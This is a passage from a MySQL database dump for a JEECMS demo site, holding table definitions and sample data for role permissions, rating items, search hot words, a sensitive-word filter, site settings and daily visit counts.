v_tree'),(2,'data:v_rename'),(2,'friendlink:v_list'),(2,'site:v_checkAccessPath'),(2,'content_reuse:v_tree'),(2,'weixinMenu:v_list'),(2,'site_config:v_base_edit'),(2,'personal:o_profile'),(2,'channel:v_check_path'),(2,'dictionary:v_ajax_edit'),(2,'directive:v_getcode'),(2,'role:v_list'),(2,'flow:source:v_list'),(2,'admin_global:v_site_add'),(2,'flow:pages:v_list'),(2,'advertising_space:v_edit'),(2,'content:o_static'),(2,'webserviceAuth:v_add'),(2,'resource:v_tree'),(2,'admin_global:v_check_email'),(2,'frame:config_main'),(2,'index'),(2,'special:v_create_dimensioncode'),(2,'log:v_list_operating'),(2,'template:template_main'),(2,'frame:config_right'),(2,'origin:v_ajax_edit'),(2,'frame:statistic_main'),(2,'channel:v_add'),(2,'member:v_list'),(2,'message:v_countUnreadMsg'),(2,'content:o_delete_share'),(2,'channel:channel_main'),(2,'log:v_list_login_failure'),(2,'log:o_delete_login_failure'),(2,'content_cycle:o_recycle'),(2,'content:o_generateTags'),(2,'plug:v_edit'),(2,'flow:visitor:v_list'),(2,'directive:v_add'),(2,'model:v_add'),(2,'template:v_tree'),(2,'admin_local:v_add'),(2,'guestbook:v_add'),(2,'directive:v_ajax_edit'),(2,'top'),(2,'message:v_list'),(2,'model:v_list'),(2,'webservice:v_edit'),(2,'content:v_copy'),(2,'scoreitem:v_add'),(2,'plug:v_add'),(2,'map'),(2,'static:v_channel'),(2,'vote_topic:v_list'),(2,'admin_global:v_channels_add'),(2,'comment:v_edit'),(2,'config:v_sso_edit'),(2,'frame:expand_right'),(2,'config:v_system_edit'),(2,'site:v_edit'),(2,'storeConfig:v_edit'),(2,'model:v_check_id'),(2,'searchwords:v_ajax_edit'),(2,'site:v_left'),(2,'tag:v_list'),(2,'jobapply:v_view'),(2,'data:v_selectfile'),(2,'department:v_tree'),(2,'content:v_pigeonhole'),(2,'group:v_edit'),(2,'scoregroup:v_add'),(2,'admin_local:v_depart_add'),(2,'static:o_reset_generate'),(2,'static:v_reset_generate'),(2,'config:v_login_edit'),(2,'frame:config_left'),(2,'department:v_check_name'),(2,'weixinMessage:v_default_set'),(2,'jobapply:v_list'),(2,'type:v_edit'),(2,'static:v_index'),(2,'member:v_edit'),(2,'content_reuse:v_left'),(2,'type:v_add'),(2,'main'),(2,'content:v_push'),(2,'statistic:content:v_list'),(2,'directive:v_edit'),(2,'static:o_index_remove'),(2,'topic:v_list'),(2,'log:o_delete_login_success_batch'),(2,'content:v_submit'),(2,'channel:v_left'),(2,'frame:maintain_right'),(2,'admin_global:v_list'),(2,'item:v_edit'),(2,'channel:v_edit'),(2,'contentBuy:user_account_list'),(2,'accountPay:payByWeiXin'),(2,'frame:expand_main'),(2,'log:o_delete_login_failure_batch'),(2,'webserviceAuth:v_list'),(2,'dictionary:v_edit'),(2,'dictionary:v_check_value'),(2,'group:v_site_list'),(2,'admin_global:v_channels_edit'),(2,'tag:v_edit'),(2,'searchwords:v_list'),(2,'acquisition:v_edit'),(2,'content:rank_list'),(2,'weixin:v_edit'),(2,'advertising_space:v_list'),(2,'config:v_firewall'),(2,'friendlink:v_edit'),(2,'content_cycle:o_delete'),(2,'static:v_content'),(2,'content:v_check_records'),(2,'frame:user_left'),(2,'flow:enterpage:v_list'),(2,'template:v_setting'),(2,'department:v_add'),(2,'content:v_view_share'),(2,'acquisition:v_add'),(2,'personal:v_profile'),(2,'special:o_create_dimensioncode'),(2,'message:v_edit'),(2,'type:v_check_id'),(2,'content_reuse:v_main'),(2,'log:o_delete_operating'),(2,'topic:by_channel'),(2,'accountPay:goToPay'),(2,'data:v_listfiles'),(2,'lucene:v_index'),(2,'department:v_channels_list'),(2,'frame:statistic_right'),(2,'scoreitem:v_list'),(2,'accountPay:payLogin'),(2,'content:v_priority'),(2,'vote_topic:v_edit'),(2,'acquisition:v_progress'),(2,'content:v_origin_list'),(2,'friendlink_ctg:v_list'),(2,'weixinMenu:v_add'),(2,'data:v_list'),(2,'member:v_check_username'),(2,'resource:v_add'),(2,'statistic:member:v_list'),(2,'contentBuy:charge_list'),(2,'frame:expand_left'),(2,'site:v_tree'),(2,'task:v_edit'),(1,'admin:index'),(1,'rest:access'),(1,'soap');
/*!40000 ALTER TABLE `jc_role_permission` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_score_group`
--

DROP TABLE IF EXISTS `jc_score_group`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_score_group` (
  `score_group_id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL COMMENT '分组名',
  `description` varchar(1000) DEFAULT NULL COMMENT '描述',
  `enable` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否启用',
  `def` tinyint(3) NOT NULL DEFAULT '0' COMMENT '是否默认',
  `site_id` int(11) NOT NULL COMMENT '站点',
  PRIMARY KEY (`score_group_id`),
  KEY `fk_jc_score_group_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 COMMENT='FComment';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_score_group`
--

LOCK TABLES `jc_score_group` WRITE;
/*!40000 ALTER TABLE `jc_score_group` DISABLE KEYS */;
INSERT INTO `jc_score_group` VALUES (1,'心情组','心情组',0,1,1),(2,'星级评分','星级评分',1,0,1);
/*!40000 ALTER TABLE `jc_score_group` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_score_item`
--

DROP TABLE IF EXISTS `jc_score_item`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_score_item` (
  `score_item_id` int(11) NOT NULL AUTO_INCREMENT,
  `score_group_id` int(11) NOT NULL COMMENT '评分组',
  `name` varchar(255) NOT NULL COMMENT '评分名',
  `score` int(11) NOT NULL COMMENT '分值',
  `image_path` varchar(255) DEFAULT NULL COMMENT '评分图标路径',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排序',
  PRIMARY KEY (`score_item_id`),
  KEY `fk_jc_score_item_group` (`score_group_id`),
  CONSTRAINT `fk_jc_score_item_group` FOREIGN KEY (`score_group_id`) REFERENCES `jc_score_group` (`score_group_id`)
) ENGINE=InnoDB AUTO_INCREMENT=14 DEFAULT CHARSET=utf8 COMMENT='评分项';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_score_item`
--

LOCK TABLES `jc_score_item` WRITE;
/*!40000 ALTER TABLE `jc_score_item` DISABLE KEYS */;
INSERT INTO `jc_score_item` VALUES (1,1,'开心',1,'/r/cms/smilies/m1.gif',1),(2,1,'板砖',1,'/r/cms/smilies/m2.gif',2),(3,1,'感动',1,'/r/cms/smilies/m3.gif',3),(4,1,'有用',1,'/r/cms/smilies/m4.gif',4),(5,1,'疑问',1,'/r/cms/smilies/m5.gif',5),(6,1,'难过',1,'/r/cms/smilies/m6.gif',6),(7,1,'无聊',1,'/r/cms/smilies/m7.gif',7),(8,1,'震惊',1,'/r/cms/smilies/m8.gif',8),(9,2,'非常差',1,'',1),(10,2,'差',2,'',2),(11,2,'一般',3,'',3),(12,2,'好',4,'',4),(13,2,'非常好',5,'',5);
/*!40000 ALTER TABLE `jc_score_item` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_score_record`
--

DROP TABLE IF EXISTS `jc_score_record`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_score_record` (
  `score_record_id` int(11) NOT NULL AUTO_INCREMENT,
  `score_item_id` int(11) NOT NULL COMMENT '评分项',
  `content_id` int(11) NOT NULL COMMENT '内容',
  `score_count` int(11) NOT NULL COMMENT '评分次数',
  PRIMARY KEY (`score_record_id`),
  KEY `fk_jc_record_score_item` (`score_item_id`),
  KEY `index_score_record_content` (`content_id`),
  CONSTRAINT `fk_jc_record_score_item` FOREIGN KEY (`score_item_id`) REFERENCES `jc_score_item` (`score_item_id`)
) ENGINE=InnoDB AUTO_INCREMENT=24 DEFAULT CHARSET=utf8 COMMENT='评分纪录';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_score_record`
--

LOCK TABLES `jc_score_record` WRITE;
/*!40000 ALTER TABLE `jc_score_record` DISABLE KEYS */;
INSERT INTO `jc_score_record` VALUES (3,1,33,17),(4,5,33,1),(6,1,32,2),(7,8,12,1),(10,1,132,1),(11,1,113,11),(12,1,27,2),(13,1,39,18),(14,1,131,13),(15,1,30,41),(16,1,14,13),(17,1,130,12),(18,1,112,18),(19,1,111,12),(20,1,29,1),(21,1,28,1),(22,1,23,11),(23,5,28,1);
/*!40000 ALTER TABLE `jc_score_record` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_search_words`
--

DROP TABLE IF EXISTS `jc_search_words`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_search_words` (
  `word_id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL COMMENT '搜索词汇',
  `hit_count` int(11) NOT NULL DEFAULT '0' COMMENT '搜索次数',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '优先级',
  `name_initial` varchar(500) NOT NULL DEFAULT '' COMMENT '拼音首字母',
  `is_recommend` tinyint(1) NOT NULL DEFAULT '0' COMMENT '推荐',
  `site_id` int(11) NOT NULL DEFAULT '1' COMMENT '站点',
  PRIMARY KEY (`word_id`)
) ENGINE=InnoDB AUTO_INCREMENT=42 DEFAULT CHARSET=utf8 COMMENT='搜索热词';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_search_words`
--

LOCK TABLES `jc_search_words` WRITE;
/*!40000 ALTER TABLE `jc_search_words` DISABLE KEYS */;
INSERT INTO `jc_search_words` VALUES (1,'台湾地震',6,10,'twdz',1,1),(5,'楼市',64,2,'ls',1,1),(6,'四川',2,11,'sc',1,1),(7,'黄金接连下跌',13,10,'hjjlxd',1,1),(8,'里约奥运会',2,12,'lyayh',1,1),(9,'电信诈骗',23,10,'dxzp',1,1),(10,'雷洋案',12,11,'lya',1,1),(13,'2015各行业平均工资',9,10,'2015gxypjgz',1,1),(14,'太阳的后裔',10,10,'tydhy',1,1),(15,'广西 ',1,10,'gx',0,1),(17,'莆田系',17,10,'ptx',1,1),(18,'巴基斯坦',1,10,'bjst',0,1),(21,'北京',1,10,'bj',0,1),(29,'中级java工程师',1,10,'zjjavagcs',0,1),(30,'高考',1,10,'gk',0,1),(31,'请输入关键词',2,10,'qsrgjc',0,1),(32,'全文检索测试',1,10,'qwjscs',0,1),(33,'草原天路收费',3,11,'cytlsf',1,1),(34,'世界',1,10,'sj',0,1),(35,'jeecms',1,10,'jeecms',0,1),(37,'涓浗寤鸿',1,10,'涓??寤h?',0,1),(38,'高考减招',22,10,'gkjz',1,1),(39,'1234＃/',1,10,'1234＃/',0,1),(40,'李克强',2,10,'lkq',0,1),(41,'年',1,10,'n',0,1);
/*!40000 ALTER TABLE `jc_search_words` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_sensitivity`
--

DROP TABLE IF EXISTS `jc_sensitivity`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_sensitivity` (
  `sensitivity_id` int(11) NOT NULL AUTO_INCREMENT,
  `search` varchar(255) NOT NULL COMMENT '敏感词',
  `replacement` varchar(255) NOT NULL COMMENT '替换词',
  PRIMARY KEY (`sensitivity_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='CMS敏感词表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_sensitivity`
--

LOCK TABLES `jc_sensitivity` WRITE;
/*!40000 ALTER TABLE `jc_sensitivity` DISABLE KEYS */;
INSERT INTO `jc_sensitivity` VALUES (1,'法论功','***');
/*!40000 ALTER TABLE `jc_sensitivity` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_site`
--

DROP TABLE IF EXISTS `jc_site`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_site` (
  `site_id` int(11) NOT NULL AUTO_INCREMENT,
  `config_id` int(11) NOT NULL COMMENT '配置ID',
  `ftp_upload_id` int(11) DEFAULT NULL COMMENT '上传ftp',
  `domain` varchar(50) NOT NULL COMMENT '域名',
  `site_path` varchar(20) NOT NULL COMMENT '路径',
  `site_name` varchar(100) NOT NULL COMMENT '网站名称',
  `short_name` varchar(100) NOT NULL COMMENT '简短名称',
  `protocol` varchar(20) NOT NULL DEFAULT 'http://' COMMENT '协议',
  `dynamic_suffix` varchar(10) NOT NULL DEFAULT '.jhtml' COMMENT '动态页后缀',
  `static_suffix` varchar(10) NOT NULL DEFAULT '.html' COMMENT '静态页后缀',
  `static_dir` varchar(50) DEFAULT NULL COMMENT '静态页存放目录',
  `is_index_to_root` char(1) NOT NULL DEFAULT '0' COMMENT '是否使用将首页放在根目录下',
  `is_static_index` char(1) NOT NULL DEFAULT '0' COMMENT '是否静态化首页',
  `locale_admin` varchar(10) NOT NULL DEFAULT 'zh_CN' COMMENT '后台本地化',
  `locale_front` varchar(10) NOT NULL DEFAULT 'zh_CN' COMMENT '前台本地化',
  `tpl_solution` varchar(50) NOT NULL DEFAULT 'default' COMMENT '模板方案',
  `final_step` tinyint(4) NOT NULL DEFAULT '2' COMMENT '终审级别',
  `after_check` tinyint(4) NOT NULL DEFAULT '2' COMMENT '审核后(1:不能修改删除;2:修改后退回;3:修改后不变)',
  `is_relative_path` char(1) NOT NULL DEFAULT '1' COMMENT '是否使用相对路径',
  `is_recycle_on` char(1) NOT NULL DEFAULT '1' COMMENT '是否开启回收站',
  `domain_alias` varchar(255) DEFAULT NULL COMMENT '域名别名',
  `domain_redirect` varchar(255) DEFAULT NULL COMMENT '域名重定向',
  `tpl_index` varchar(255) DEFAULT NULL COMMENT '首页模板',
  `keywords` varchar(255) DEFAULT NULL COMMENT '站点关键字',
  `description` varchar(255) DEFAULT NULL COMMENT '站点描述',
  `tpl_mobile_solution` varchar(50) NOT NULL DEFAULT 'mobile' COMMENT '手机站模板方案',
  `mobile_static_dir` varchar(50) DEFAULT '/wap' COMMENT '手机站静态页存放目录',
  `mobile_static_sync` tinyint(1) NOT NULL DEFAULT '0' COMMENT '手机站静态页同步生成',
  `ftp_sync_page_id` int(11) DEFAULT NULL COMMENT '静态页同步FTP',
  `page_is_sync_ftp` tinyint(1) NOT NULL DEFAULT '0' COMMENT '静态页同步发布FTP',
  `resouce_is_sync_ftp` tinyint(1) NOT NULL DEFAULT '0' COMMENT '资源同步发布FTP',
  PRIMARY KEY (`site_id`),
  UNIQUE KEY `ak_domain_path` (`domain`),
  KEY `fk_jc_site_config` (`config_id`),
  KEY `fk_jc_site_upload_ftp` (`ftp_upload_id`),
  CONSTRAINT `fk_jc_site_config` FOREIGN KEY (`config_id`) REFERENCES `jc_config` (`config_id`),
  CONSTRAINT `fk_jc_site_upload_ftp` FOREIGN KEY (`ftp_upload_id`) REFERENCES `jo_ftp` (`ftp_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='CMS站点表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_site`
--

LOCK TABLES `jc_site` WRITE;
/*!40000 ALTER TABLE `jc_site` DISABLE KEYS */;
INSERT INTO `jc_site` VALUES (1,1,NULL,'localhost','www','jeecms演示站','jeecms演示站','http://','.jhtml','.html','/html','0','0','zh_CN','zh_CN','default',3,3,'0','1','','','','JEECMS－JAVA网站内容管理系统|开源java cms系统,jsp cms网站管理','JEECMS-国内优秀的JAVA(JSP)网站内容管理系统','mobile','/wap',0,NULL,0,0);
/*!40000 ALTER TABLE `jc_site` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_site_access`
--

DROP TABLE IF EXISTS `jc_site_access`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_site_access` (
  `access_id` int(11) NOT NULL AUTO_INCREMENT,
  `session_id` varchar(32) NOT NULL DEFAULT '',
  `site_id` int(11) NOT NULL COMMENT '站点id',
  `access_time` time NOT NULL COMMENT '访问时间',
  `access_date` date NOT NULL COMMENT '访问日期',
  `ip` varchar(50) NOT NULL DEFAULT '',
  `area` varchar(50) DEFAULT NULL COMMENT '访问地区',
  `access_source` varchar(255) DEFAULT NULL COMMENT '访问来源',
  `external_link` varchar(255) DEFAULT NULL COMMENT '外部链接网址',
  `engine` varchar(50) DEFAULT NULL COMMENT '搜索引擎',
  `entry_page` varchar(255) DEFAULT NULL COMMENT '入口页面',
  `last_stop_page` varchar(255) DEFAULT NULL COMMENT '最后停留页面',
  `visit_second` int(11) DEFAULT NULL COMMENT '访问时长(秒)',
  `visit_page_count` int(11) DEFAULT NULL COMMENT '访问页面数',
  `operating_system` varchar(50) DEFAULT NULL COMMENT '操作系统',
  `browser` varchar(50) DEFAULT NULL COMMENT '浏览器',
  `keyword` varchar(255) DEFAULT NULL COMMENT '来访关键字',
  PRIMARY KEY (`access_id`),
  KEY `fk_jc_access_site` (`site_id`),
  CONSTRAINT `fk_jc_access_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='站点访问表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_site_access`
--

LOCK TABLES `jc_site_access` WRITE;
/*!40000 ALTER TABLE `jc_site_access` DISABLE KEYS */;
/*!40000 ALTER TABLE `jc_site_access` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_site_access_count`
--

DROP TABLE IF EXISTS `jc_site_access_count`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_site_access_count` (
  `access_count` int(11) NOT NULL AUTO_INCREMENT,
  `page_count` int(11) NOT NULL DEFAULT '1' COMMENT '访问页数',
  `visitors` int(11) NOT NULL DEFAULT '0' COMMENT '用户数',
  `statistic_date` date NOT NULL COMMENT '统计日期',
  `site_id` int(11) NOT NULL COMMENT '统计站点',
  PRIMARY KEY (`access_count`),
  KEY `fk_jc_access_count_site` (`site_id`),
  CONSTRAINT `fk_jc_access_count_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=272 DEFAULT CHARSET=utf8 COMMENT='每日统计页数访问情况';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_site_access_count`
--

LOCK TABLES `jc_site_access_count` WRITE;
/*!40000 ALTER TABLE `jc_site_access_count` DISABLE KEYS */;
INSERT INTO `jc_site_access_count` VALUES (1,3,1,'2016-06-24',1),(2,12,1,'2016-06-25',1),(3,13,1,'2016-06-25',1),(4,18,1,'2016-06-25',1),(5,19,1,'2016-06-25',1),(6,24,1,'2016-06-25',1),(7,28,1,'2016-06-25',1),(8,53,1,'2016-06-25',1),(9,1,1,'2016-06-25',1),(10,8,1,'2016-06-25',1),(11,11,1,'2016-06-25',1),(12,1,1,'2016-06-28',1),(13,4,1,'2016-06-28',1),(14,14,1,'2016-06-28',1),(15,25,1,'2016-06-28',1),(16,5,1,'2016-06-29',1),(17,6,1,'2016-06-29',1),(18,15,1,'2016-06-29',1),(19,16,1,'2016-06-29',1),(20,3,2,'2016-06-30',1),(21,2,1,'2016-06-30',1),(22,1,3,'2016-07-01',1),(23,2,1,'2016-07-07',1),(24,9,1,'2016-07-07',1),(25,1,2,'2016-07-08',1),(26,1,1,'2016-07-11',1),(27,4,1,'2016-07-11',1),(28,2,2,'2016-07-12',1),(29,1,3,'2016-07-14',1),(30,2,2,'2016-07-14',1),(31,1,2,'2016-07-15',1),(32,4,1,'2016-07-15',1),(33,4,1,'2016-07-18',1),(34,13,1,'2016-07-18',1),(35,18,1,'2016-07-18',1),(36,59,1,'2016-07-18',1),(37,1,4,'2016-07-19',1),(38,2,1,'2016-07-19',1),(39,3,1,'2016-07-19',1),(40,6,1,'2016-07-19',1),(41,16,1,'2016-07-19',1),(42,52,1,'2016-07-19',1),(43,2,2,'2016-07-20',1),(44,2,2,'2016-07-25',1),(45,1,1,'2016-07-26',1),(46,2,1,'2016-07-27',1),(47,2,2,'2016-07-28',1),(48,6,1,'2016-07-28',1),(49,8,1,'2016-07-28',1),(50,67,1,'2016-07-28',1),(51,69,1,'2016-07-28',1),(52,1,1,'2016-07-30',1),(53,4,1,'2016-07-30',1),(54,7,1,'2016-07-30',1),(55,2,1,'2016-08-01',1),(56,2,1,'2016-08-02',1),(57,2,2,'2016-08-03',1),(58,5,1,'2016-08-03',1),(59,2,1,'2016-08-04',1),(60,1,1,'2016-08-05',1),(61,2,1,'2016-08-05',1),(62,3,1,'2016-08-05',1),(63,1,1,'2016-08-06',1),(64,4,1,'2016-08-06',1),(65,1,2,'2016-08-08',1),(66,2,1,'2016-08-08',1),(67,3,1,'2016-08-08',1),(68,1,2,'2016-08-09',1),(69,5,1,'2016-08-09',1),(70,1,6,'2016-08-10',1),(71,2,2,'2016-08-10',1),(72,3,1,'2016-08-11',1),(73,1,4,'2016-08-12',1),(74,5,1,'2016-08-12',1),(75,2,3,'2016-08-15',1),(76,1,2,'2016-08-15',1),(77,1,3,'2016-08-16',1),(78,3,1,'2016-08-16',1),(79,1,1,'2016-08-17',1),(80,2,1,'2016-08-18',1),(81,3,1,'2016-08-18',1),(82,1,2,'2016-08-19',1),(83,1,1,'2016-08-20',1),(84,2,1,'2016-08-20',1),(85,3,1,'2016-08-20',1),(86,5,1,'2016-08-20',1),(87,2,1,'2016-08-21',1),(88,1,2,'2016-08-22',1),(89,3,2,'2016-08-22',1),(90,2,1,'2016-08-22',1),(91,15,1,'2016-08-22',1),(92,1,2,'2016-08-23',1),(93,3,1,'2016-08-23',1),(94,4,1,'2016-08-23',1),(95,1,1,'2016-08-24',1),(96,3,1,'2016-08-24',1),(97,1,2,'2016-08-25',1),(98,8,1,'2016-08-25',1),(99,2,1,'2016-08-25',1),(100,1,3,'2016-08-26',1),(101,1,3,'2016-08-29',1),(102,1,9,'2016-08-30',1),(103,2,2,'2016-08-30',1),(104,3,1,'2016-08-30',1),(105,4,1,'2016-08-30',1),(106,5,1,'2016-08-30',1),(107,7,1,'2016-08-30',1),(108,8,1,'2016-08-30',1),(109,9,1,'2016-08-30',1),(110,1,1,'2016-08-31',1),(111,2,1,'2016-08-31',1),(112,1,2,'2016-09-01',1),(113,2,2,'2016-09-01',1),(114,3,2,'2016-09-01',1),(115,10,1,'2016-09-02',1),(116,1,1,'2016-09-03',1),(117,5,1,'2016-09-03',1),(118,1,1,'2016-09-04',1),(119,3,1,'2016-09-04',1),(120,4,1,'2016-09-04',1),(121,1,1,'2016-09-05',1),(122,3,1,'2016-09-05',1),(123,4,1,'2016-09-05',1),(124,6,1,'2016-09-05',1),(125,1,4,'2016-09-06',1),(126,2,3,'2016-09-06',1),(127,6,2,'2016-09-06',1),(128,7,1,'2016-09-06',1),(129,3,1,'2016-09-06',1),(130,3,3,'2016-09-07',1),(131,1,1,'2016-09-07',1),(132,2,1,'2016-09-07',1),(133,2,1,'2016-09-08',1),(134,5,1,'2016-09-08',1),(135,1,2,'2016-09-09',1),(136,3,1,'2016-09-09',1),(137,1,4,'2016-09-12',1),(138,4,1,'2016-09-12',1),(139,5,1,'2016-09-12',1),(140,1,7,'2016-09-13',1),(141,2,3,'2016-09-13',1),(142,5,2,'2016-09-13',1),(143,8,2,'2016-09-13',1),(144,10,1,'2016-09-13',1),(145,16,1,'2016-09-13',1),(146,3,1,'2016-09-13',1),(147,4,1,'2016-09-13',1),(148,7,1,'2016-09-13',1),(149,2,2,'2016-09-14',1),(150,1,1,'2016-09-14',1),(151,5,1,'2016-09-14',1),(152,7,1,'2016-09-14',1),(153,2,2,'2016-09-19',1),(154,1,1,'2016-09-20',1),(155,2,1,'2016-09-21',1),(156,1,3,'2016-09-22',1),(157,5,1,'2016-09-22',1),(158,16,1,'2016-09-22',1),(159,2,5,'2016-09-23',1),(160,1,4,'2016-09-23',1),(161,3,2,'2016-09-23',1),(162,4,1,'2016-09-23',1),(163,5,1,'2016-09-23',1),(164,6,1,'2016-09-23',1),(165,8,1,'2016-09-23',1),(166,15,1,'2016-09-23',1),(167,25,1,'2016-09-23',1),(168,2,1,'2016-09-24',1),(169,1,8,'2016-09-26',1),(170,2,2,'2016-09-26',1),(171,5,1,'2016-09-26',1),(172,90,1,'2016-09-26',1),(173,167,1,'2016-09-26',1),(174,3,1,'2016-09-26',1),(175,4,1,'2016-09-26',1),(176,1,4,'2016-09-27',1),(177,2,1,'2016-09-27',1),(178,4,1,'2016-09-27',1),(179,104,1,'2016-09-27',1),(180,1,17,'2016-09-28',1),(181,2,4,'2016-09-28',1),(182,3,4,'2016-09-28',1),(183,5,3,'2016-09-28',1),(184,6,3,'2016-09-28',1),(185,8,3,'2016-09-28',1),(186,4,3,'2016-09-28',1),(187,7,2,'2016-09-28',1),(188,64,1,'2016-09-28',1),(189,9,1,'2016-09-28',1),(190,10,1,'2016-09-28',1),(191,14,1,'2016-09-28',1),(192,26,1,'2016-09-28',1),(193,42,1,'2016-09-28',1),(194,51,1,'2016-09-28',1),(195,1,14,'2016-09-29',1),(196,2,10,'2016-09-29',1),(197,3,3,'2016-09-29',1),(198,4,3,'2016-09-29',1),(199,7,2,'2016-09-29',1),(200,5,1,'2016-09-29',1),(201,6,1,'2016-09-29',1),(202,31,1,'2016-09-29',1),(203,106,1,'2016-09-29',1),(204,1,5,'2016-09-30',1),(205,2,2,'2016-09-30',1),(206,3,1,'2016-09-30',1),(207,16,1,'2016-09-30',1),(208,73,1,'2016-09-30',1),(209,128,1,'2016-09-30',1),(210,5,1,'2016-10-01',1),(211,13,1,'2016-10-02',1),(212,1,1,'2016-10-03',1),(213,1,1,'2016-10-05',1),(214,10,1,'2016-10-06',1),(215,1,7,'2016-10-08',1),(216,2,4,'2016-10-08',1),(217,4,4,'2016-10-08',1),(218,19,2,'2016-10-08',1),(219,6,2,'2016-10-08',1),(220,9,1,'2016-10-08',1),(221,11,1,'2016-10-08',1),(222,13,1,'2016-10-08',1),(223,14,1,'2016-10-08',1),(224,3,1,'2016-10-08',1),(225,21,1,'2016-10-08',1),(226,29,1,'2016-10-08',1),(227,5,1,'2016-10-08',1),(228,31,1,'2016-10-08',1),(229,34,1,'2016-10-08',1),(230,7,1,'2016-10-08',1),(231,182,1,'2016-10-08',1),(232,8,1,'2016-10-08',1),(233,1,5,'2016-10-09',1),(234,2,4,'2016-10-09',1),(235,4,2,'2016-10-09',1),(236,8,1,'2016-10-09',1),(237,10,1,'2016-10-09',1),(238,38,1,'2016-10-09',1),(239,45,1,'2016-10-09',1),(240,161,1,'2016-10-09',1),(241,7,1,'2016-10-09',1),(242,1,2300,'2016-10-10',1),(243,6,3,'2016-10-10',1),(244,8,1,'2016-10-10',1),(245,9,1,'2016-10-10',1),(246,17,1,'2016-10-10',1),(247,18,1,'2016-10-10',1),(248,30,1,'2016-10-10',1),(249,60,1,'2016-10-10',1),(250,138,1,'2016-10-10',1),(251,2,1,'2016-10-10',1),(252,214,1,'2016-10-10',1),(253,3,1,'2016-10-10',1),(254,4,1,'2016-10-10',1),(255,1,4,'2016-10-11',1),(256,8,3,'2016-10-11',1),(257,5,1,'2016-10-11',1),(258,6,1,'2016-10-11',1),(259,7,1,'2016-10-11',1),(260,11,1,'2016-10-11',1),(261,20,1,'2016-10-11',1),(262,2,1,'2016-10-11',1),(263,3,1,'2016-10-11',1),(264,1,1,'2016-10-12',1),(265,5,1,'2016-10-12',1),(266,15,1,'2016-10-12',1),(267,1,2,'2016-10-13',1),(268,3,1,'2016-10-13',1),(269,2,1,'2016-10-14',1),(270,9,1,'2016-10-14',1),(271,1,1,'2016-12-20',1);
/*!40000 ALTER TABLE `jc_site_access_count` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_site_access_pages`
--

DROP TABLE IF EXISTS `jc_site_access_pages`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_site_access_pages` (
  `access_pages_id` int(11) NOT NULL AUTO_INCREMENT,
  `access_page` varchar(255) NOT NULL COMMENT '访问页面',
  `session_id` varchar(32) NOT NULL,
  `access_date` date NOT NULL DEFAULT '0000-00-00' COMMENT '访问日期',
  `access_time` time NOT NULL COMMENT '访问时间',
  `visit_second` int(11) NOT NULL DEFAULT '0' COMMENT '停留时长（秒）',
  `page_index` int(11) NOT NULL DEFAULT '0' COMMENT '用户访问页面的索引',
  `site_id` int(11) NOT NULL DEFAULT '1',
  PRIMARY KEY (`access_pages_id`),
  KEY `fk_jc_access_pages_access` (`session_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='访问详细页面表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_site_access_pages`
--

LOCK TABLES `jc_site_access_pages` WRITE;
/*!40000 ALTER TABLE `jc_site_access_pages` DISABLE KEYS */;
/*!40000 ALTER TABLE `jc_site_access_pages` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_site_access_statistic`
--

DROP TABLE IF EXISTS `jc_site_access_statistic`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
